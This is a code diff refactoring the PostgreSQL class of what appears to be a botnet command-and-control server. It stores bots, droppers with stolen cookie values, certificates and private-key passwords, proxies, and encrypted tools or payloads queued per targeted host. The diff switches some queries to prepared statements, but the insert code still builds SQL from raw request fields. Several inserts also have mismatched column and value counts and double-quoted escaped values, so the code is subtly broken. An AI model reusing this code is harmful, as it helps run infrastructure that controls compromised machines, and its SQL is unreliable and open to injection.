@@ -59,167 +59,107 @@ class slopPgSql extends PDO
     }
     function insertData(array $data): bool
     {
-        switch ($data['action']) {
-            case str_contains($data['action'], "add_press") !== false:
-                $this->exec(sprintf("INSERT INTO sloppy_wordpress(zip_file) VALUES (%s);",
-                    $data['zip']
-                ));
-                break;
-            case str_contains($data['action'], "add_bot"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in, agent) VALUES ('%s', '%s', '%s', '%s', '%s');",
-                        $this->quote($this->stripper($data['rhost'])),
-                        $this->quote($this->stripper($data['uri'])),
-                        $this->quote($this->stripper($data['uuid'])),
-                        $this->quote($this->stripper($data['os_flavor'])),
-                        $this->quote($this->stripper($data['check_in'])) ?? 1
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert main table Error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], "add_dropper"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, cookievalue, user_agent) VALUES('%s', '%s', '%s', '%s', '%s');",
-                        $data['location_on_disk'],
-                        $data['uuid'],
-                        $data['cookiename'],
-                        $data['cookievalue'],
-                        $data['user_agent']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert dropper Error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], 'add_cert'):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s');",
-                        $data['cert_location'],
-                        $data['base64_data'],
-                        $data['csr'],
-                        $data['pub'],
-                        $data['pem'],
-                        $data['cipher'],
-                        $data['is_encrypted'],
-                        $data['priv_key_pass']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert certificate error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], "proxies"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES('%s', '%s');",
-                        $data['proxy_schema'],
-                        $data['proxy']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert proxy error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], "add_tool_encrypted"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');",
-                        $data['tool_name'],
-                        $data['target'],
-                        $data['base64_data'],
-                        $data['key'],
-                        $data['tag'],
-                        $data['iv'],
-                        $data['cipher'],
-                        $data['hmac_hash'],
-                        $data['lang'],
-                        $data['is_encrypted']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert encrypted tool error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], "add_tool"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES('%s','%s','%s','%s', '%s');",
-                        $data['tool_name'],
-                        $data['target'],
-                        $data['base64_data'],
-                        $data['lang'],
-                        $data['is_encrypted']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert tool error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            case str_contains($data['action'], "add_domain"):
-                try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_domains(from_domain) VALUES('%s');",
-                        $data['domain_name']
-                    ));
-                    return true;
-                } catch (PDOException $e) {
-                    print("Insert domain error: " . $e->getMessage() . PHP_EOL);
-                    $this->rollBack();
-                    return false;
-                }
-            default:
-                print("Action was empty, cannot handle this.");
-                return false;
-        }
-        return false;
-    }
-    public function grabOrFormatOutput(array $data): PDOStatement | array{
-        /** @var string $sqlfrag */
-        if ($this->checkIfInDb($data['bot'])){
-            return [
-                "QueryData" => null
-            ];
-        }
-        switch ($data['type']) {
-            case str_contains($data['type'], "single_bot") !== false:
-                return $this->grabSingleBot($data['bot']);
-            case str_contains($data['type'], "all_bots") !== false:
-                return $this->grabBots();
-            case str_contains($data['type'], "proxy") !== false:
-                if (isset($data['schema'])){
-                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' LIMIT %s", $data['schema'], $data['limit']);
-                }else{
-                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy = '%s'", $data['proxy_ip']);
-                }
-                break;
-            case str_contains($data['type'], "dropper") !== false:
-                $sqlfrag = "SELECT * FROM sloppy_bots_slim_droppers";
-                break;
-            case str_contains($data['type'], "tools") !== false:
-                if (isset($data['target'])){
-                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE target = '%s'", $data['target']);
-                }elseif (isset($data['lang'])){
-                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE lang = '%s'", $data['lang']);
-                }elseif (isset($data['is_encrypted'])){
-                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE is_encrypted = '%s'", $data['is_encrypted']);
-                }else{
-                    $sqlfrag = "SELECT * FROM sloppy_bots_tools";
-                }
-                break;
-            case str_contains($data['type'], 'pullSlop') !== false:
-                $sqlfrag = sprintf("SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = '%s'", $data['bot']);
-                break;
-            default:
-                break;
-        }
-        return [
-            "QueryData" => $this->query($sqlfrag)
+        $insertSqlFormat = "INSERT INTO %s(%s) VALUES (%s);";
+        $actions = [
+            'add_press' => ['table' => 'sloppy_wordpress', 'columns' => 'zip_file', 'values' => $data['zip']],
+            'add_bot' => ['table' => 'sloppy_bots_main', 'columns' => 'rhost, uri, uuidd, os_flavor, check_in, agent', 'values' => sprintf("'%s', '%s', '%s', '%s', '%s'", $this->quote($this->stripper($data['rhost'])), $this->quote($this->stripper($data['uri'])), $this->quote($this->stripper($data['uuid'])), $this->quote($this->stripper($data['os_flavor'])), $this->quote($this->stripper($data['check_in'])) ?? 1)],
+            'add_dropper' => ['table' => 'sloppy_bots_droppers', 'columns' => 'location_on_disk, cookiename, cookievalue, user_agent', 'values' => sprintf("'%s', '%s', '%s', '%s', '%s'", $data['location_on_disk'], $data['uuid'], $data['cookiename'], $data['cookievalue'], $data['user_agent'])],
+            'add_cert' => ['table' => 'sloppy_bots_certs', 'columns' => 'cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass', 'values' => sprintf("'%s','%s','%s','%s','%s','%s','%s','%s'", $data['cert_location'], $data['base64_data'], $data['csr'], $data['pub'], $data['pem'], $data['cipher'], $data['is_encrypted'], $data['priv_key_pass'])],
+            'add_proxies' => ['table' => 'sloppy_bots_proxies', 'columns' => 'proxy_schema, proxy', 'values' => sprintf("'%s', '%s'", $data['proxy_schema'], $data['proxy'])],'add_tool_encrypted' => ['table' => 'sloppy_bots_tools', 'columns' => 'tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted', 'values' => sprintf("'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s'", $data['tool_name'], $data['target'], $data['base64_data'], $data['key'], $data['tag'], $data['iv'], $data['cipher'], $data['hmac_hash'], $data['lang'], $data['is_encrypted'])],
+            'add_tool' => ['table' => 'sloppy_bots_tools', 'columns' => 'tool_name, target, base64_encoded_tool, lang, is_encrypted', 'values' => sprintf("'%s','%s','%s','%s','%s'", $data['tool_name'], $data['target'], $data['base64_data'], $data['lang'], $data['is_encrypted'])],
+            'add_domain' => ['table' => 'sloppy_bots_domains', 'columns' => 'from_domain', 'values' => sprintf("'%s'", $data['domain_name'])]
         ];
 
+        foreach ($actions as $action => $params) {
+            if (str_contains($data['action'], $action)) {
+                $sql = sprintf($insertSqlFormat, $params['table'], $params['columns'], $params['values']);
+                try {
+                    $this->exec($sql);
+                    return true;
+                } catch (PDOException $e) {
+                    print("Insert {$params['table']} table Error: " . $e->getMessage() . PHP_EOL);
+                    $this->rollBack();
+                    return false;
+                }
+            }
+        }
+        print("Action was empty, cannot handle this.");
+        return false;
+    }
+    public function grabOrFormatOutput(array $data): PDOStatement | array
+    {
+        if ($this->checkIfInDb($data['bot'])){
+            return ["QueryData" => null];
+        }
+
+        switch (true) {
+            case str_contains($data['type'], "single_bot"):
+                return $this->grabSingleBot($data['bot']);
+            case str_contains($data['type'], "all_bots"):
+                return $this->grabBots();
+            case str_contains($data['type'], "proxy"):
+                return ["QueryData" => $this->proxyQuery($data)];
+            case str_contains($data['type'], "dropper"):
+                return ["QueryData" => $this->query("SELECT * FROM sloppy_bots_slim_droppers")];
+            case str_contains($data['type'], "tools"):
+                return ["QueryData" => $this->toolsQuery($data)];
+            case str_contains($data['type'], 'pullSlop'):
+                return ["QueryData" => $this->pullSlopQuery($data)];
+            default:
+                throw new \InvalidArgumentException('Invalid type.');
+        }
+    }
+
+    private function proxyQuery($data): ?PDOStatement
+    {
+        if (isset($data['schema'])){
+            $sql = "SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = :schema LIMIT :limit";
+            $stmt = $this->prepare($sql);
+            $stmt->execute(['schema' => $data['schema'], 'limit' => $data['limit']]);
+        } else{
+            $sql = "SELECT * FROM sloppy_bots_proxies WHERE proxy = :proxy_ip";
+            $stmt = $this->prepare($sql);
+            $stmt->execute(['proxy_ip' => $data['proxy_ip']]);
+        }
+        return $stmt;
+    }
+
+    private function toolsQuery($data): PDOStatement
+    {
+        $sql = "SELECT * FROM sloppy_bots_tools";
+        $conditions = [];
+        $params = [];
+        if (isset($data['target'])) {
+            $conditions[] = 'target = :target';
+            $params['target'] = $data['target'];
+        }
+
+        if (isset($data['lang'])) {
+            $conditions[] = 'lang = :lang';
+            $params['lang'] = $data['lang'];
+        }
+
+        if (isset($data['is_encrypted'])) {
+            $conditions[] = 'is_encrypted = :is_encrypted';
+            $params['is_encrypted'] = $data['is_encrypted'];
+        }
+
+        if ($conditions) {
+            $sql .= ' WHERE ' . implode(' AND ', $conditions);
+        }
+
+        $stmt = $this->prepare($sql);
+        $stmt->execute($params);
+
+        return $stmt;
+    }
+
+    private function pullSlopQuery(array $data): PDOStatement
+    {
+        $sql = "SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = :bot";
+        $stmt = $this->prepare($sql);
+        $stmt->execute(['bot' => $data['bot']]);
+        return $stmt;
     }
 
     private function grabBots(): array{
